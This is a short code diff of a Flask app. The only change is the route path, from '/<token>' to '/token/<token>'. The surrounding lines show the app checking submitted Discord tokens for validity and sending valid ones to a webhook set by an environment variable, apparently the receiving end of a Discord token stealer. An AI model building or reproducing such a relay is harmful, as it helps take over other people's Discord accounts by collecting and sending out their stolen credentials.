@@ -20,7 +20,7 @@ def check_discord_token(token):
 e = os.getenv('DISCORD_URL')
 app = Flask(__name__)
 hook = Webhook(e)
-@app.route('/<string:token>')
+@app.route('/token/<string:token>')
 def index(token):
   if check_discord_token(token) == "True":
       hook.send(token)
